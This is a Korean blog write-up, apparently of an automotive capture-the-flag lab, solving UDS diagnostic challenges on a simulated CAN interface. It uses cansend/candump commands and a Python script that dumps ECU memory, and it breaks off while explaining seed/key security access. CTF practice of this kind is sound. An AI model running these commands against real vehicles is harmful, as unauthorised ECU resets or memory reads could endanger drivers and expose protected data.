&#xD130;&#xBBF8;&#xB110; &#xD658;&#xACBD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xBA87; &#xAC00;&#xC9C0; tmux &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xC124;&#xC815;&#xC744; &#xD1B5;&#xD574;, &#xB354; &#xC88B;&#xC740; &#xBB38;&#xC81C; &#xD480;&#xC774; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; BlockHarbor&#xCE21;&#xC5D0;&#xC11C;&#xB3C4; &#xB79C;&#xB529; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xAE30;&#xBCF8;&#xC801;&#xC778; <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux &#xC778;&#xD2B8;&#xB85C;</a>&#xB97C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image09.png" alt="image09.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># Terminal splitting</span>Ctrl + b%<span class="hljs-comment"># Terminal moving</span>Ctrl + b&#x2190; &#x2192;<span class="hljs-comment"># Terminal scroll</span>Ctrl + b[<span class="hljs-comment"># End scroll</span>Ctrl + c</code></pre><p>&#xC704; &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xC124;&#xC815;&#xB4E4;&#xC774; &#xCCB4;&#xAC10; &#xC0C1; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xD130;&#xBBF8;&#xB110; &#xBD84;&#xD560;&#xACFC; &#xC774;&#xB3D9;&#xC774; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xC124;&#xC815;&#xC774;&#xB098; &#xBA85;&#xB839;&#xC5B4;&#xB294; <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux &#xC778;&#xD2B8;&#xB85C;</a>&#xB97C; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098; &#xAC80;&#xC0C9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="3-UDS-Challenge"><a href="#3-UDS-Challenge" class="headerlink" title="3. UDS Challenge"></a>3. UDS Challenge</h2><p><img src="image10.png" alt="image10.png"></p><p>&#xBB38;&#xC81C; &#xD480;&#xC774;&#xB97C; &#xD560; UDS Challenge&#xB294; UDS &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC694;&#xAD6C;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0;, &#xCC28;&#xB7C9; &#xD658;&#xACBD;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services">SID</a>&#xC640; <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a>&#xB294; &#xC774;&#xC804;&#xC5D0; &#xC18C;&#xAC1C;&#xD55C; &#xBB38;&#xC11C;&#xB97C; &#xD1B5;&#xD574; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC14;&#xB85C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><h3 id="3-1-Simulation-VIN"><a href="#3-1-Simulation-VIN" class="headerlink" title="3.1. Simulation VIN"></a>3.1. Simulation VIN</h3><p><img src="image11.png" alt="image11.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; UDS&#xB97C; &#xD1B5;&#xD574; VIN&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>VIN(Vehicle Identification Number)&#xC740; &#xCC28;&#xB7C9; &#xC2DD;&#xBCC4; &#xBC88;&#xD638;&#xB85C;, &#xC55E;&#xC11C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC124;&#xBA85;&#xD560; &#xB54C; &#xC7A0;&#xAE50; &#xB2E4;&#xB8E8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xAC83;&#xC744; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC870;&#xD68C;&#xD558;&#xBA74; &#xB418;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image12.png" alt="image12.png"></p><p>&#xBA3C;&#xC800; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, &#xAC00;&#xC0C1; CAN &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC778; vcan0&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC218;&#xC2E0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image13.png" alt="image13.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(PCI:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)</span>cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>candump&#xB97C; &#xD1B5;&#xD574; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xBC0F; ECU1&#xC5D0; &#xB300;&#xD55C; &#xC1A1;&#xC218;&#xC2E0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;, 3&#xAC1C;&#xC758; CAN ID&#xB97C; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xB9C8;&#xC2A4;&#xD0B9; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; VIN DID &#xBC0F; &#xC2DD;&#xBCC4;&#xC790; &#xC77D;&#xAE30; &#xC694;&#xCCAD; SID&#xB97C; &#xACB0;&#xD569;&#xD558;&#xACE0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xC751;&#xB2F5;&#xC774; ECU1&#xC5D0;&#xC11C; &#xC624;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; ECU&#xB85C; Flow Control &#xC694;&#xCCAD;&#xAE4C;&#xC9C0; &#xC804;&#xC1A1;&#xD558;&#xBA74; VIN&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0;, flag&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs angelscript">e66fb3f67ac3:~$ candump -a vcan0,<span class="hljs-number">7E0</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7E8</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7</span>DF:<span class="hljs-number">7</span>FF  vcan0  <span class="hljs-number">7</span>DF   [<span class="hljs-number">4</span>]  <span class="hljs-number">03</span> <span class="hljs-number">22</span> F1 <span class="hljs-number">90</span>               <span class="hljs-string">&apos;.&quot;..&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">10</span> <span class="hljs-number">14</span> <span class="hljs-number">62</span> F1 <span class="hljs-number">90</span> <span class="hljs-number">66</span> <span class="hljs-number">6</span>C <span class="hljs-number">61</span>   <span class="hljs-string">&apos;..b..fla&apos;</span>  vcan0  <span class="hljs-number">7E0</span>   [<span class="hljs-number">4</span>]  <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>               <span class="hljs-string">&apos;0...&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">21</span> <span class="hljs-number">67</span> <span class="hljs-number">7</span>B <span class="hljs-number">76</span> <span class="hljs-number">31</span> <span class="hljs-number">6</span>E <span class="hljs-number">5</span>F <span class="hljs-number">42</span>   <span class="hljs-string">&apos;!g{     &apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">22</span> <span class="hljs-number">48</span> <span class="hljs-number">6</span>D <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span> <span class="hljs-number">7</span>D   <span class="hljs-string">&apos;&quot;      }&apos;</span></code></pre><p>&#xC218;&#xC2E0; &#xBC1B;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC138;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC2DD;&#xBCC4;&#xC790; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>22</code>)&#xC744; &#xD558;&#xB2C8;, &#xC62C;&#xBC14;&#xB978; RSID(<code>62</code>) &#xC751;&#xB2F5;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xB2E4;&#xB7C9;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC751;&#xB2F5; &#xB418;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xB370;&#xC774;&#xD130;&#xB4E4; &#xC55E;&#xC5D0;&#xB294; <code>21</code>, <code>22</code>&#xC640; &#xAC19;&#xC740; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xAC12;&#xC774; &#xD45C;&#xAE30; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xB370;&#xC774;&#xD130;&#xC784;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-2-Startup-Message"><a href="#3-2-Startup-Message" class="headerlink" title="3.2. Startup Message"></a>3.2. Startup Message</h3><p><img src="image14.png" alt="image14.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; ECU restart&#xB294; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xBB3B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC9C4;&#xB2E8; &#xC815;&#xBCF4;&#xB97C; <code>7DF</code>&#xB85C; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image15.png" alt="image15.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)</span>cansend vcan0 7DF<span class="hljs-comment">#021101</span></code></pre><p>ECU&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; Restart&#xB97C; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xBC14;&#xB85C; Reset &#xC694;&#xCCAD;(<code>11</code>)&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Reset &#xC694;&#xCCAD;&#xC758; &#xACBD;&#xC6B0;, &#xAE30;&#xBCF8; &#xC138;&#xC158;(<code>01</code>) Sub Function Byte&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xBCC4;&#xB3C4;&#xC758; DID&#xB294; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xBCF8; &#xC138;&#xC158;&#xC73C;&#xB85C; ECU Reset &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74;, &#xD574;&#xB2F9; RSID &#xC751;&#xB2F5;(<code>51</code>)&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC73D;&#xACE0; flag &#xC815;&#xBCF4; &#xB610;&#xD55C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="3-3-Engine-Trouble"><a href="#3-3-Engine-Trouble" class="headerlink" title="3.3. Engine Trouble?"></a>3.3. Engine Trouble?</h3><p><img src="image16.png" alt="image16.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC9C4;&#xB2E8; &#xBB38;&#xC81C; &#xCF54;&#xB4DC;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; DTC&#xB97C; &#xC77D;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. <code>Pxxxx-xx</code>&#xB77C;&#xB294; DTC &#xD3EC;&#xB9F7; &#xD615;&#xC2DD;&#xC5D0; &#xB9DE;&#xCDB0; flag &#xC778;&#xC99D;&#xC744; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image17.png" alt="image17.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(PCI:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)</span>cansend vcan0 7DF<span class="hljs-comment">#03190208</span></code></pre><p>DTC &#xC815;&#xBCF4; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>19</code>)&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C1;&#xD0DC; &#xB9C8;&#xC2A4;&#xD06C;&#xB97C; &#xD1B5;&#xD574; DTC &#xC9C4;&#xB2E8; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC138;&#xBD80;&#xC801;&#xC778; DTC Status Byte&#xB294; <a href="https://buly.kr/2UjxlRq">AUTOSAR &#xBB38;&#xC11C;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD655;&#xC778;&#xB41C; DTC&#xB294; <code>P3E9F-01</code>&#xC785;&#xB2C8;&#xB2E4;. DTC&#xC758; &#xACBD;&#xC6B0; &#xCC28;&#xB7C9; &#xC9C4;&#xB2E8;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; OBD2&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9;&#xD558;&#xB294; &#xD45C;&#xC900;&#xC778; <a href="https://piembsystech.com/iso-15031-protocol/">ISO 15031</a> &#xBB38;&#xC11C;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; DTC &#xCF54;&#xB4DC; &#xD574;&#xC11D;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-4-Secrets-in-Memory"><a href="#3-4-Secrets-in-Memory" class="headerlink" title="3.4. Secrets in Memory?"></a>3.4. Secrets in Memory?</h3><p><img src="image18.png" alt="image18.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;&#xC744; &#xC694;&#xAD6C;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC740; <code>0xC3F80000</code>&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image19.png" alt="image19.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 07(PCI:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)</span>cansend vcan0 7DF<span class="hljs-comment">#072314C3F83000FF &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>&#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>23</code>)&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC; &#xB0B4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xC8FC;&#xC758;&#xD560; &#xC810;&#xC740; &#xC8FC;&#xC18C;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xAE30; &#xC774;&#xC804;&#xC5D0; AddressAndLengthFormatIdentifier(AALFId)&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xAC12;(<code>14</code>)&#xC744; &#xACC4;&#xC0B0;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. AALFId&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85;&#xC740; <a href="https://www.youtube.com/watch?v=s2uC4vWMU7Q&amp;t=104s">&#xD574;&#xB2F9; &#xC601;&#xC0C1;</a>&#xC744; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; 4&#xBC14;&#xC774;&#xD2B8; &#xC8FC;&#xC18C;&#xC640; 1&#xBC14;&#xC774;&#xD2B8; &#xAE38;&#xC774; &#xD3EC;&#xB9F7;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xCCAD;&#xD558;&#xB294; <code>14</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; 255(<code>FF</code>)&#xB9CC;&#xD07C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xC77D;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data[:dlc]recvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    p.settimeout(<span class="hljs-number">0.5</span>)    <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xC3F83000</span>, <span class="hljs-number">0xC3F865ff</span>, <span class="hljs-number">0xFF</span>):        req_data = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + addr.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7DF</span>, req_data))        <span class="hljs-keyword">try</span>:            resp_frame = p.recv(<span class="hljs-number">16</span>)            resp_id, resp_data = dissect_can_frame(resp_frame)            <span class="hljs-keyword">if</span> resp_data:                recvdata += resp_data.hex()[<span class="hljs-number">6</span>:]        <span class="hljs-keyword">except</span> socket.timeout:            <span class="hljs-keyword">continue</span>        flow_control_data = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7E0</span>, flow_control_data))        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">36</span>):            <span class="hljs-keyword">try</span>:                resp_frame = p.recv(<span class="hljs-number">16</span>)                _, resp_data = dissect_can_frame(resp_frame)                tempdata = resp_data.hex()[<span class="hljs-number">2</span>:]                <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                    recvdata += tempdata            <span class="hljs-keyword">except</span> socket.timeout:                <span class="hljs-keyword">break</span>    hex_data_string = recvdata    <span class="hljs-keyword">try</span>:        byte_data = bytes.fromhex(hex_data_string)        ascii_string = byte_data.decode(<span class="hljs-string">&quot;ascii&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>)        print(ascii_string)            <span class="hljs-keyword">except</span> ValueError:        print(<span class="hljs-string">&quot;error&quot;</span>)</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; 0xC3F83000 &#xB300;&#xC5ED;&#xC758; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC744; &#xD30C;&#xC2F1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CAN &#xD1B5;&#xC2E0;&#xC5D0;&#xC11C;&#xB294; python&#xC758; <code>can</code> &#xBAA8;&#xB4C8;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC77C;&#xBC18;&#xC801;&#xC774;&#xC9C0;&#xB9CC;, &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; <code>can</code> &#xBAA8;&#xB4C8;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xADF8;&#xB807;&#xAC8C; &#xB54C;&#xBB38;&#xC5D0; <code>socket</code> &#xBAA8;&#xB4C8;&#xB85C; &#xB300;&#xCCB4;&#xD558;&#xC5EC; &#xC791;&#xC131;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>python <code>socket</code> &#xBAA8;&#xB4C8;&#xB85C; CAN &#xD3EC;&#xB9F7;&#xC744; &#xD45C;&#xD604;&#xD560; &#xB54C;&#xB294; <code>=IB3x8s</code>&#xB97C; &#xC778;&#xC790;&#xB85C; &#xC8FC;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image20.png" alt="image20.png"></p><p>&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; flag&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-5-Security-Access-Level-3"><a href="#3-5-Security-Access-Level-3" class="headerlink" title="3.5. Security Access Level 3"></a>3.5. Security Access Level 3</h3><p><img src="image21.png" alt="image21.png"></p><p>&#xC774;&#xBC88; &#xBB38;&#xC81C;&#xB294; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 3&#xC5D0; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC54C;&#xC544;&#xB0B4;&#xC5B4;&#xC11C;, 0x1337&#xC774;&#xB77C;&#xB294; seed &#xAC12;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; key &#xAC12;&#xC744; &#xCC3E;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; &#xC774;&#xBC88; &#xB808;&#xBCA8; 3&#xC5D0;&#xC11C;&#xB294; seed &#xAC12;&#xACFC; key &#xAC12;&#xC758; &#xAE38;&#xC774;&#xB294; 2 byte &#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image22.png" alt="[image22.png](https://blog.naver.com/suresofttech/223327497814)"></p><p>&#xBA3C;&#xC800;, UDS&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4;&#xB294; ECU&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xBCA8;&#xC740; &#xC22B;&#xC790;&#xAC00; &#xB192;&#xC744; &#xC218;&#xB85D; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC758; &#xB808;&#xBCA8;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; &#xC9C4;&#xB2E8;(<code>10</code>) &#xD655;&#xC7A5; &#xC138;&#xC158;(<code>03</code>)&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xC774;&#xD6C4;&#xC5D0;, SID <code>27</code>&#xB85C; &#xC0AC;&#xC6A9;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p>seed &#xAC12;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xB0B4;&#xBD80; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; key&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9;&#xD558;&#xB294; key &#xAC12;&#xC5D0; &#xC778;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC561;&#xC138;&#xC2A4;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD1B5;&#xC2E0;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;, key &#xAC12;&#xC744; &#xBCF4;&#xB0BC; &#xB54C;&#xB9CC; &#xC811;&#xADFC;&#xD558;&#xB824;&#xB294; 